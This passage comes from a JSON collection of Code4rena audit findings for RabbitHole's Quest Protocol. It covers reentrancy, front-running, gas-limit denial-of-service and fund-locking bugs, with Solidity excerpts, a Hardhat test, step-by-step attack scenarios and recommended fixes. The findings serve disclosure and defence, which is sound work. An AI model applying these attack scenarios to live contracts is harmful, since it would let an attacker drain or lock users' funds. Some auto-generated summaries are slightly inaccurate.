intentionally front-run User B's buy transaction by monitoring the mempool in polygon using the service\n\n<https://www.blocknative.com/blog/polygon-mempool>\n\nOr it could be just two users submit transactions at the same time and User A's claim transaction happens to execute first.\n\n### Recommended Mitigation Steps\n\nDisable NFT transfer and trade once the NFT is used to claim the reward.\n\n**[waynehoover (RabbitHole) acknowledged](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/119)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Quest Protocol that allows a buyer on a secondary NFT market to lose funds if they buy a NFT that is already used to claim a reward. The vulnerability is caused by a function in the Quest.sol smart contract called claim(). This function sets the NFT as claimed, preventing it from being used to claim the reward again, but does not prevent it from being traded in the secondary market. \n\nThe bug can be exploited in the following way. User A has 1 NFT, which they can use to claim 1 ETH reward. User A then places a sell order in Opensea and sells the NFT for 0.9 ETH. User B sees the sell order and decides to buy the NFT. User A and B both submit their transactions at the same time, and User A's claim transaction executes first, meaning the reward goes to User A and the NFT ownership goes to User B. However, User B cannot claim the reward because it has already been claimed by User A.\n\nThe bug was discovered through manual review. The recommended mitigation steps are to disable NFT transfer and trade once the NFT is used to claim the reward.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/119",
      "tags": [],
      "finders": [
        "StErMi",
        "rbserver",
        "ElKu",
        "ladboy233",
        "CodingNameKiki",
        "Tricko",
        "0xmrhoodie",
        "adriro",
        "0x4non"
      ]
    },
    {
      "id": "8858",
      "title": "[M-07] Funds can be stuck due to wrong order of operations",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L102-L104><br>\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L81-L87>\n\nThe contract `ERC20Quest.sol` has two functions of interest here. The first is `withdrawFee()`, which is responsible for transferring out the fee amount from the contract once endTime has been passed, and the second is `withdrawRemainingTokens()` which recovers the remaining tokens in the contract which haven't been claimed yet.\n\nFunction `withdrawRemainingTokens()`:\n\n```solidity\nfunction withdrawRemainingTokens(address to_) public override onlyOwner {\n        super.withdrawRemainingTokens(to_);\n\n        uint unclaimedTokens = (receiptRedeemers() - redeemedTokens) * rewardAmountInWeiOrTokenId;\n        uint256 nonClaimableTokens = IERC20(rewardToken).balanceOf(address(this)) - protocolFee() - unclaimedTokens;\n        IERC20(rewardToken).safeTransfer(to_, nonClaimableTokens);\n    }\n```\n\nAs evident from this excerpt, calling this recovery function subtracts the tokens which are already assigned to someone who completed the quest, and the fee, and returns the rest. However, there is no check for whether the fee has already been paid or not. The owner is expected to first call `withdrawRemainingTokens()`, and then call `withdrawFee()`.\n\nHowever, if the owner calls `withdrawFee()` before calling the function `withdrawRemainingTokens()`, the fee will be paid out by the first call, but the same fee amount will still be kept in the contract after the second function call, basically making it unrecoverable. Since there are no checks in place to prevent this, this is classified as a high severity since it is an easy mistake to make and leads to loss of funds of the owner.\n\n### Proof of Concept\n\nThis can be demonstrated with this test\n\n```javascript\ndescribe('Funds stuck due to wrong order of function calls', async () => {\n    it('should trap funds', async () => {\n      await deployedFactoryContract.connect(firstAddress).mintReceipt(questId, messageHash, signature)\n      await deployedQuestContract.start()\n      await ethers.provider.send('evm_increaseTime', [86400])\n      await deployedQuestContract.connect(firstAddress).claim()\n\n      await ethers.provider.send('evm_increaseTime', [100001])\n      await deployedQuestContract.withdrawFee()\n      await deployedQuestContract.withdrawRemainingTokens(owner.address)\n\n      expect(await deployedSampleErc20Contract.balanceOf(deployedQuestContract.address)).to.equal(200)\n      expect(await deployedSampleErc20Contract.balanceOf(owner.address)).to.be.lessThan(\n        totalRewardsPlusFee * 100 - 1 * 1000 - 200\n      )\n      await ethers.provider.send('evm_increaseTime', [-100001])\n      await ethers.provider.send('evm_increaseTime', [-86400])\n    })\n  })\n```\n\nEven though the fee is paid, the contract still retains the fee amount. The owner receives less than the expected amount. This test is a modification of the test `should transfer non-claimable rewards back to owner` already present in `ERC20Quest.spec.ts`.\n\n### Tools Used\n\nHardhat\n\n### Recommended Mitigation Steps\n\nOnly allow fee to be withdrawn after the owner has withdrawn the funds.\n\n```solidity\n// Declare a boolean to check if recovery happened\nbool recoveryDone;\n\nfunction withdrawRemainingTokens(address to_) public override onlyOwner {\n        super.withdrawRemainingTokens(to_);\n\n        uint unclaimedTokens = (receiptRedeemers() - redeemedTokens) * rewardAmountInWeiOrTokenId;\n        uint256 nonClaimableTokens = IERC20(rewardToken).balanceOf(address(this)) - protocolFee() - unclaimedTokens;\n        IERC20(rewardToken).safeTransfer(to_, nonClaimableTokens);\n   \n        // Set recovery bool\n        recoveryDone = true;\n    }\nfunction withdrawFee() public onlyAdminWithdrawAfterEnd {\n        // Check recovery\n        require(recoveryDone,\"Recover tokens before withdrawing Fees\");\n        IERC20(rewardToken).safeTransfer(protocolFeeRecipient, protocolFee());\n    }\n```\n\n**[waynehoover (RabbitHole) disagreed with severity and commented](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/122#issuecomment-1440966653):**\n > I agree that this is an issue, but not a high risk issue. I expect high risk issues to be issues that can be called by anyone, not owners.\n> \n> As owners there are plenty of ways we can sabotage our contracts (for example via the set* functions) it is an issue for an owner.\n> \n> The owner understands how these functions work, so they can be sure to call them in the right order.\n\n**[kirk-baird (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/122#issuecomment-1442582881):**\n > I agree with the sponsor that since this is an `onlyOwner` function that medium severity is more appropriate.\n> \n> The likelihood of this issue is reduced as it can only be called by the owner.\n> \n> Note: the ineffective `onlyAdminWithdrawAfterEnd` modifier not validating admin is raised in another issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the contract ERC20Quest.sol which is responsible for transferring out the fee amount and recovering the remaining tokens in the contract which haven't been claimed yet. The two functions of interest here are `withdrawFee()` and `withdrawRemainingTokens()`. If the owner calls `withdrawFee()` before calling the function `withdrawRemainingTokens()`, the fee will be paid out by the first call, but the same fee amount will still be kept in the contract after the second function call, leading to loss of funds of the owner. This bug is classified as high severity since it is an easy mistake to make. Hardhat was used as the tool for testing. The recommended mitigation step is to only allow fee to be withdrawn after the owner has withdrawn the funds. This can be done by declaring a boolean to check if recovery has happened and setting it to true after the recovery function is called.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/122",
      "tags": [],
      "finders": [
        "carrotsmuggler",
        "HollaDieWaldfee",
        "omis",
        "bin2chen",
        "ElKu",
        "evan",
        "hansfriese",
        "peanuts",
        "hl_",
        "KmanOfficial",
        "Iurii3",
        "adriro",
        "AkshaySrivastav",
        "mert_eren"
      ]
    },
    {
      "id": "8857",
      "title": "[M-06] RabbitHoleReceiptâ€™s address might be changed therefore only manual mint will be available",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L13\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L44\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L96-L118\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L95-L104\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L215-L229\n\n\n## Vulnerability details\n\n## Impact\nMight be impossible to claim rewards by users. And admins must distribute tokens manually and pay fee for this. On a huge amount of participants this leads to huge amount of fees. \n\n\n## Proof of Concept\n\nLet's consider ```QuestFactory```. It has:\n```solidity\n    RabbitHoleReceipt public rabbitholeReceiptContract;\n```\nWhich responsible for mint tokens for users.\n\nThen consider ```createQuest``` function. Here we pass ```rabbitholeReceiptContract``` into ```Quest```. \n\nIn ```Quest``` this field is immutable.\n\nNow lets consider next case:\n\n1) We initialized whole contracts.\n2) We created new Quest.  \n3) Next we decided to change ```rabbitholeReceiptContract``` in ```QuestFactory``` for another. To do this we call: ```setRabbitHoleReceiptContract```. And successfully changing address.\n4) Next we distribute signatures to our participants.\n5) Users starts to mint tokens. But here is a bug ```QuestFactory``` storages new  address of ```rabbitholeReceiptContract```, but ```Quest``` initialized with older one. So users successfully minted their tokens, but can't exchange them for tokens because the Quest's receipt contract know nothing about minted tokens.\n\nPossible solution here is change ```minterAddress``` in the original ```RabbitHoleReceipt``` contract and manually mint tokens by admin, but it will be too expensive and the company may lost a lot of money.\n \n\n## Tools Used\n\nManual audit\n\n## Recommended Mitigation Steps\n\nIn ```QuestFactory``` contract in the function ```mintReceipt```  the rabbitholeReceiptContract must be fetched from the quest directly.\nTo ```Quest``` Add:\n```solidity\nfunction getRabbitholeReceiptContract() public view returns(RabbitHoleReceipt) {\n    return rabbitHoleReceiptContract;\n}\n```\n\nModify ```mintReceipt``` function in ```QuestFactory``` like:\n```solidity\nfunction mintReceipt(string memory questId_, bytes32 hash_, bytes memory signature_) public {\n    ...\n    RabbitHoleReceipt rabbitholeReceiptContract = Quest(quests[questId_].questAddress).getRabbitholeReceiptContract();\n    rabbitholeReceiptContract.mint(msg.sender, questId_);\n    ...\n}\n```",
      "summary": "\nThis bug report is about a vulnerability found in the Quest Protocol code. The lines of code that were affected were located in Quest.sol (lines 13, 44, and 96-118), RabbitHoleReceipt.sol (lines 95-104), and QuestFactory.sol (lines 215-229). The impact of this vulnerability is that users may not be able to claim their rewards and admins will have to manually distribute tokens and pay fees for that. \n\nThe proof of concept for this vulnerability is as follows: first, a Quest is initialized and a RabbitHoleReceipt contract is passed into it. Then, the QuestFactory is changed to a new RabbitHoleReceipt contract. When users try to mint tokens, the QuestFactory has the new address but the Quest has the old address, so the users can't exchange their tokens for rewards. \n\nThe recommended mitigation steps are to modify the mintReceipt function in the QuestFactory contract to fetch the RabbitHoleReceipt contract from the Quest directly. Also, the Quest should be amended to add a getRabbitholeReceiptContract function. \n\nOverall, this bug report is about a vulnerability in the Quest Protocol code that could prevent users from claiming rewards and require admins to manually distribute tokens and pay fees for that. The recommended mitigation steps are to modify the mintReceipt function in the QuestFactory contract and add a getRabbitholeReceiptContract function to the Quest.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/425",
      "tags": [],
      "finders": [
        "adriro",
        "libratus",
        "hansfriese",
        "glcanvas"
      ]
    },
    {
      "id": "8856",
      "title": "[M-05] When rewardToken is erc1155/erc777, an attacker can reenter and cause funds to be stuck in the contract forever",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/rabbitholegg/quest-protocol/blob/068d628f019e9469aecbf676370075c1f6c980fd/contracts/Quest.sol#L113-L116\n\n\n## Vulnerability details\n\n## Impact\nIf the reward token is `erc1155/erc777` an attacker can reenter and then buy/transfer another unclaimed token to the attacker address and then  the var \n`redeemTokens` wont be equal to how many tokens were actually redeemed. \n\n## Proof of Concept\nex:\nreward token is an erc1155 that has  `_afterTokenTransfer` \nAlice(attacker) has 2  receipt tokens, the first one is on a  smart contract that will do the reentrancy, and the second  one is on Alice's address but is approved   to transfer to  the  smart contract(the own that holds the first receipt)\n1. Alice calls the sc to `claim` rewards\n```solidity\n IERC1155(rewardToken).safeTransferFrom(address(this), msg.sender, rewardAmountInWeiOrTokenId, amount_, '0x00');\n``` \n2. `_afterTokenTransfer`  which causes the sc  to  call a function in its fallback function that transfers  the approved token to  the sc\n```solidity\n   try IERC1155Receiver(to).onERC1155Received(operator, from, id, amount, data) returns (bytes4 response) {\n```\n3. We then reenter with  recipient,not yet claimed token  and we claim it \nresult:\n the invariant that `redeemedTokens` = tokens that are redeemed is false because it doesn't account for the first token that we reentered.\n The issue is worse  with `erc777` tokens because of  the fact  that accounting will be in  the `withdrawRemainingTokens` function\n```solidity \n\n        uint256 unclaimedTokens = (receiptRedeemers() - redeemedTokens) * rewardAmountInWeiOrTokenId;\n        uint256 nonClaimableTokens = IERC20(rewardToken).balanceOf(address(this)) - protocolFee() - unclaimedTokens;\n        IERC20(rewardToken).safeTransfer(to_, nonClaimableTokens);\n\n```\nafter the reentrancy \nex: `redeemedTokens=9` but should be 10\n`receiptRedeemers()=12` \n`rewardAmountInWeiOrTokenId=1e5`\n`unclaimedTokens=300000 `\nassuming they are some tokens left \n`balance(address(this)=201000` and `protocolFee=500`\n`nonClaimableTokens=201000 - 500 - 300000` it would revert ( negative numbers  with uint) and   funds would be stuck in the contract forever\nThe real estimate for `nonClaimableTokens=201000-500-200000=500` and the owner can get funds out \nbut 500 wei will be lost in the contract \nand  it can get worse with large amounts of quests and the attacker  reentering multiple times to cause a bigger gap between the real `redeemedTokens`  \n## Tools Used\n\n## Recommended Mitigation Steps\nadd  nonReentrancy modifier",
      "summary": "\nThis bug report is about a vulnerability in the Quest Protocol, a smart contract on the Ethereum blockchain. If the reward token is an ERC1155/ERC777, an attacker can reenter and buy/transfer another unclaimed token to their address. This would cause the variable `redeemTokens` to not be equal to the number of tokens actually redeemed. This could result in funds being stuck in the contract forever if the difference between the real `redeemedTokens` and the expected `redeemedTokens` is large enough.\n\nTo mitigate this vulnerability, a non-reentrancy modifier should be added to the code. This would prevent an attacker from reentering the contract and buying/transferring the unclaimed tokens.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/523",
      "tags": [],
      "finders": [
        "simon135",
        "zaskoh",
        "ForkEth",
        "0x4non",
        "ArmedGoose"
      ]
    },
    {
      "id": "8855",
      "title": "[M-04] Users may not claim Erc1155 rewards when the Quest has ended",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc1155Quest.sol#L60><br>\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L114><br>\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc1155Quest.sol#L41-L43>\n\nUnlike Erc20Quest.sol, owner of Erc1155Quest.sol is going to withdraw the remaining tokens from the contract when `block.timestamp == endTime` without deducting the `unclaimedTokens`. As a result, users will be denied of service when attempting to call the inherited `claim()` from Quest.sol.\n\n### Proof of Concept\n\nAs can be seen from the code block below, when the Quest time has ended, `withdrawRemainingTokens()` is going to withdraw the remaining tokens from the contract on line 60:\n\n[File: Erc1155Quest.sol#L52-L63](https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc1155Quest.sol#L52-L63)\n\n```solidity\n    /// @dev Withdraws the remaining tokens from the contract. Only able to be called by owner\n    /// @param to_ The address to send the remaining tokens to\n    function withdrawRemainingTokens(address to_) public override onlyOwner {\n        super.withdrawRemainingTokens(to_);\n        IERC1155(rewardToken).safeTransferFrom(\n            address(this),\n            to_,\n            rewardAmountInWeiOrTokenId,\n60:            IERC1155(rewardToken).balanceOf(address(this), rewardAmountInWeiOrTokenId),\n            '0x00'\n        );\n    }\n```\n\nWhen a user tries to call `claim()` below, line 114 is going to internally invoke `_transferRewards()`:\n\n[File: Quest.sol#L94-L118](https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L94-L118)\n\n```solidity\n    /// @notice Allows user to claim the rewards entitled to them\n    /// @dev User can claim based on the (unclaimed) number of tokens they own of the Quest\n    function claim() public virtual onlyQuestActive {\n        if (isPaused) revert QuestPaused();\n\n        uint[] memory tokens = rabbitHoleReceiptContract.getOwnedTokenIdsOfQuest(questId, msg.sender);\n\n        if (tokens.length == 0) revert NoTokensToClaim();\n\n        uint256 redeemableTokenCount = 0;\n        for (uint i = 0; i < tokens.length; i++) {\n            if (!isClaimed(tokens[i])) {\n                redeemableTokenCount++;\n            }\n        }\n\n        if (redeemableTokenCount == 0) revert AlreadyClaimed();\n\n        uint256 totalRedeemableRewards = _calculateRewards(redeemableTokenCount);\n        _setClaimed(tokens);\n114:        _transferRewards(totalRedeemableRewards);\n        redeemedTokens += redeemableTokenCount;\n\n        emit Claimed(msg.sender, totalRedeemableRewards);\n    }\n```\n\n`safeTransferFrom()` is going to revert on line 42 because the token balance of the contract is now zero. i.e. less than `amount_`:\n\n[File: Erc1155Quest.sol#L39-L43](https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc1155Quest.sol#L39-L43)\n\n```solidity\n    /// @dev Transfers the reward token `rewardAmountInWeiOrTokenId` to the msg.sender\n    /// @param amount_ The amount of reward tokens to transfer\n    function _transferRewards(uint256 amount_) internal override {\n42:        IERC1155(rewardToken).safeTransferFrom(address(this), msg.sender, rewardAmountInWeiOrTokenId, amount_, '0x00');\n    }\n```\n\n### Recommended Mitigation Steps\n\nConsider refactoring `withdrawRemainingTokens()` as follows:\n\n(Note: The contract will have to separately import {QuestFactory} from './QuestFactory.sol' and initialize `questFactoryContract`.\n\n```diff\n+    function receiptRedeemers() public view returns (uint256) {\n+        return questFactoryContract.getNumberMinted(questId);\n+    }\n\n    function withdrawRemainingTokens(address to_) public override onlyOwner {\n        super.withdrawRemainingTokens(to_);\n\n+        uint unclaimedTokens = (receiptRedeemers() - redeemedTokens)\n+        uint256 nonClaimableTokens = IERC1155(rewardToken).balanceOf(address(this), rewardAmountInWeiOrTokenId) - unclaimedTokens;\n        IERC1155(rewardToken).safeTransferFrom(\n            address(this),\n            to_,\n            rewardAmountInWeiOrTokenId,\n-            IERC1155(rewardToken).balanceOf(address(this), rewardAmountInWeiOrTokenId),\n+            nonClaimableTokens,\n            '0x00'\n        );\n    }\n```\n\n**[kirk-baird (judge) increased severity to High](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/528#issuecomment-1425183624)**\n\n**[waynehoover (RabbitHole) disagreed with severity and commented](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/528#issuecomment-1440959685):**\n > I agree that this is an issue, but not a high risk issue. I expect high risk issues to be issues that can be called by anyone, not owners. \n> \n> As owners there are plenty of ways we can sabotage our contracts (for example via the set* functions) it is an issue for an owner. \n> \n> The owner understands how this function works, so they can be sure not to call it before all users have called claim.\n\n**[kirk-baird (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/528#issuecomment-1442583850):**\n > Similarly to [`#122`](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/122), this is an `onlyOwner` function and therefore the likelihood is significantly reduce. Therefore I'm going to downgrade this issue to Medium.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Erc1155Quest.sol contract from the Quest Protocol. The vulnerability is that when the Quest time has ended, the owner of the contract is able to withdraw the remaining tokens from the contract without deducting the unclaimed tokens. This means that when a user attempts to call the inherited claim() from Quest.sol, the call will fail because the token balance of the contract is zero. \n\nThe impact of this vulnerability is that users will be denied of service when attempting to call the inherited claim() from Quest.sol. The bug was identified using manual inspection. \n\nThe recommended mitigation steps are to refactor the withdrawRemainingTokens() function to deduct the unclaimed tokens before transferring the remaining tokens from the contract. This will ensure that the users are able to call the claim() function even after the Quest time has ended.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/528",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "AlexCzm",
        "0xMirce",
        "holme",
        "BClabs",
        "usmannk",
        "peanuts",
        "rbserver",
        "minhquanym",
        "CodingNameKiki",
        "adriro",
        "AkshaySrivastav",
        "Josiah",
        "csanuragjain",
        "hihen",
        "cccz",
        "peakbolt",
        "RaymondFam",
        "Aymen0909",
        "wait",
        "chaduke",
        "zaskoh",
        "KIntern_NA",
        "MiniGlome",
        "StErMi",
        "omis",
        "bin2chen",
        "ElKu",
        "gzeon",
        "ubermensch",
        "rvierdiiev",
        "libratus",
        "timongty"
      ]
    },
    {
      "id": "8854",
      "title": "[M-03] DOS risk if enough tokens are minted in Quest.claim can lead, at least, to transaction fee lost",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L99><br>\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L117-L133>\n\n`claim` function can be summaraized in next steps:\n\n1.  Check that the quest is active\n2.  Check the contract is not paused\n3.  Get tokens corresponding to msg.sender for `questId` using `rabbitHoleReceiptContract.getOwnedTokenIdsOfQuest`: **DOS**\n4.  Check that msg.sender owns at least one token\n5.  Count non claimed tokens\n6.  Check there is at least 1 unclaimed token\n7.  Calculate redeemable rewards: `_calculateRewards(redeemableTokenCount);`\n8.  Set all token to claimed state\n9.  Update `redeemedTokens`\n10. Emit claim event\n\nThe problem with this functions relays in its dependency on `RabbitHoleReceipt.getOwnedTokenIdsOfQuest`. It's behaviour can be summarized in next steps:\n\n1.  Get queried balance (claimingAddress\\_)\n2.  Get claimingAddress\\_ owned tokens\n3.  Filter tokens corresponding to questId\\_\n4.  Return token of claimingAddress\\_ corresponding to questId\\_\n\nIf a user actively participates in multiple quests and accumulates a large number of tokens, the claim function may eventually reach the block gas limit. As a result, the user may be unable to successfully claim their earned tokens.\n\n### Impact\n\nIt can be argued that function `ERC721.burn` can address the potential DOS risk in the claim process. However, it is important to note the following limitations and drawbacks associated with this approach:\n\n1.  Utilizing `ERC721.burn` does not prevent the user from incurring network fees if a griefer, who has already claimed their rewards, sends their tokens to the user with the intent of causing a DOS and inducing loss of gas.\n2.  If the user has not claimed any rewards from their accumulated tokens, they will still be forced to burn at least some of their tokens, resulting in a loss of these assets.\n\n### Proof of Concept\n\n**Griefing**\n\n1.  Alice has took part in many quests, and want to recieve her rewards, so she call Quest.claim() function\n2.  Bob also has already claimed many rewards from many quest, and decide to frontrun alice an send her all his tokens to DOS her\n3.  Alice run out of gas, she lose transaction fees.\n\n**Lose of unclaimed rewards**\n\n1.  Alice always takes part in many quests, but never claims her rewards. She trusts RabbitHole protocol and is waiting to have much more rewards to claim in order to save some transaction fees.\n2.  When Alice decide to call claim function she realizes that she has run out of gas.\n\nThen, Alice can only burn some of her tokens to claim at least some rewards.\n\n**Code**\n\n[Code sample](https://gist.github.com/carlitox477/85e37d26c6f810304c849c93235ee99e)\n\n### Recommended Mitigation steps\n\nIf a user can send a token list by parameter to claim function, then this vector attack can be mitigated.\n\nTo do this add next function to `RabbitHoleReceipt.sol`:\n\n```solidity\nfunction checkTokenCorrespondToQuest(uint tokenId, string memory questId_) external view returns(bool){\n    return keccak256(bytes(questIdForTokenId[tokenId])) == keccak256(bytes(questId_));\n}\n```\n\nThen modify `Quest.claim`:\n\n```diff\n// Quest.sol\n-   function claim() public virtual onlyQuestActive {\n+   function claim(uint[] memory tokens) public virtual onlyQuestActive {\n        if (isPaused) revert QuestPaused();\n\n-       uint[] memory tokens = rabbitHoleReceiptContract.getOwnedTokenIdsOfQuest(questId, msg.sender);\n\n        // require(tokens.length > 0)\n        if (tokens.length == 0) revert NoTokensToClaim();\n\n        uint256 redeemableTokenCount = 0;\n        for (uint i = 0; i < tokens.length; i++) {\n            // Check that the token correspond to this quest\n            require(rabbitHoleReceiptContract.checkTokenCorrespondToQuest(tokens[i],questId))\n\n-           if (!isClaimed(tokens[i])) {\n+           if (!isClaimed(tokens[i]) && rabbitHoleReceiptContract.checkTokenCorrespondToQuest(tokens[i],questId)) {\n                redeemableTokenCount++;\n            }\n        }\n\n        if (redeemableTokenCount == 0) revert AlreadyClaimed();\n\n        uint256 totalRedeemableRewards = _calculateRewards(redeemableTokenCount);\n        _setClaimed(tokens);\n        _transferRewards(totalRedeemableRewards);\n        redeemedTokens += redeemableTokenCount;\n\n        emit Claimed(msg.sender, totalRedeemableRewards);\n    }\n```\n\n**[kirk-baird (judge) decreased severity to Medium](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/552#issuecomment-1429385027)**\n\n**[waynehoover (RabbitHole) acknowledged](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/552#issuecomment-1504020208)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a potential Denial of Service (DOS) risk in the Quest.claim function of the RabbitHole Protocol. The function is dependent on the RabbitHoleReceipt.getOwnedTokenIdsOfQuest, which can be summarized in four steps: getting the queried balance, getting the claiming address' owned tokens, filtering tokens corresponding to the questId, and returning the token of the claiming address corresponding to the questId.\n\nIf a user participates in multiple quests and accumulates a large number of tokens, the claim function may eventually reach the block gas limit. As a result, the user may be unable to successfully claim their earned tokens, incurring network fees if a griefer, who has already claimed their rewards, sends their tokens to the user with the intent of causing a DOS and inducing loss of gas. Even if the user has not claimed any rewards from their accumulated tokens, they will still be forced to burn at least some of their tokens, resulting in a loss of these assets.\n\nThe bug can be mitigated by allowing the user to send a token list as a parameter to the claim function. This can be done by adding a checkTokenCorrespondToQuest function to the RabbitHoleReceipt.sol, and modifying the Quest.claim function to check if the token corresponds to the questId.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/552",
      "tags": [
        "DOS",
        "Denial-Of-Service"
      ],
      "finders": [
        "glcanvas",
        "ladboy233",
        "cryptojedi88",
        "Tointer",
        "mookimgo",
        "lukris02",
        "minhquanym",
        "adriro",
        "p4st13r4",
        "IllIllI",
        "simon135",
        "0xbepresent",
        "betweenETHlines",
        "UdarTeam",
        "0xRobocop",
        "Atarpara",
        "trustindistrust",
        "horsefacts",
        "ArmedGoose",
        "luxartvinsec",
        "manikantanynala97",
        "gzeon",
        "evan",
        "thekmj",
        "carlitox477",
        "libratus"
      ]
    },
    {
      "id": "8853",
      "title": "[M-02] User may lose rewards if the receipt is minted after quest end time",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L219-L229><br>\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L81-L87>\n\nAfter completing a task in the context of a quest, a user receives a signed hash that needs to be redeemed on-chain for a receipt that can later be claimed for a reward.\n\nThe receipt is minted in the `mintReceipt` function present in the `QuestFactory` contract:\n\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L219-L229>\n\n```solidity\nfunction mintReceipt(string memory questId_, bytes32 hash_, bytes memory signature_) public {\n    if (quests[questId_].numberMinted + 1 > quests[questId_].totalParticipants) revert OverMaxAllowedToMint();\n    if (quests[questId_].addressMinted[msg.sender] == true) revert AddressAlreadyMinted();\n    if (keccak256(abi.encodePacked(msg.sender, questId_)) != hash_) revert InvalidHash();\n    if (recoverSigner(hash_, signature_) != claimSignerAddress) revert AddressNotSigned();\n\n    quests[questId_].addressMinted[msg.sender] = true;\n    quests[questId_].numberMinted++;\n    emit ReceiptMinted(msg.sender, questId_);\n    rabbitholeReceiptContract.mint(msg.sender, questId_);\n}\n```\n\nThis function doesn't check if the quest has ended, and the hash doesn't contain any kind of deadline. A user may receive a signed hash and mint the receipt at any point in time.\n\nThe quest owner can withdraw remaining tokens after the quest end time using the `withdrawRemainingTokens` present in the quests contracts. This is the implementation for `Erc20Quest`:\n\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L81-L87>\n\n```solidity\nfunction withdrawRemainingTokens(address to_) public override onlyOwner {\n    super.withdrawRemainingTokens(to_);\n\n    uint unclaimedTokens = (receiptRedeemers() - redeemedTokens) * rewardAmountInWeiOrTokenId;\n    uint256 nonClaimableTokens = IERC20(rewardToken).balanceOf(address(this)) - protocolFee() - unclaimedTokens;\n    IERC20(rewardToken).safeTransfer(to_, nonClaimableTokens);\n}\n\nfunction receiptRedeemers() public view returns (uint256) {\n    return questFactoryContract.getNumberMinted(questId);\n}\n```\n\nThe function calculates how many receipts have been minted but are pending to be claimed, in order to leave the funds in the contract so the user can still claim those. However, this won't take into account receipts that are still pending to be minted.\n\n### Impact\n\nA user can mint the receipt for completing the task after the quest has ended, and in particular, if this is done after the owner of the quest has called `withdrawRemainingTokens`, then the user won't be able to claim the reward associated with that receipt.\n\nThis occurs because the user can mint the receipt after the quest end time, while the owner may have already withdrawn the remaining tokens, which only accounts for previously minted receipts.\n\nGiven this scenario, the user won't be able to claim the rewards, the contract won't have the required funds.\n\n### 